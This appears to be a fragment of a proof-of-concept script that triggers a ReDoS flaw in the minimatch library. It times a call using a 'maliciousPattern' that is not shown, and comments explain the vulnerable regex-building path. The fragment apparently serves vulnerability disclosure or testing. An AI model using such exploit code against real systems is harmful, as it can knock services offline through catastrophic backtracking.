  const testInput = 'ab'.repeat(30) + 'c';

  console.log('🔍 Triggering minimatch ReDoS via parse/compile pipeline...');
  const startTime = performance.now();

  // Invokes the vulnerable path: minimatch() -> new Minimatch() -> parse() -> compile() -> match().
  // In affected versions, the internal regex building logic (around escaped alternation handling)
  // does not cap pattern complexity. The resulting regex triggers catastrophic backtracking on testInput.
  const matched = minimatch.minimatch(testInput, maliciousPattern);

  const elapsed = performance.now() - startTime;
  console.log(`⏱️  Execution took ${elapsed.toFixed(2)}ms`);
  console.log('📦 Match result:', matched);

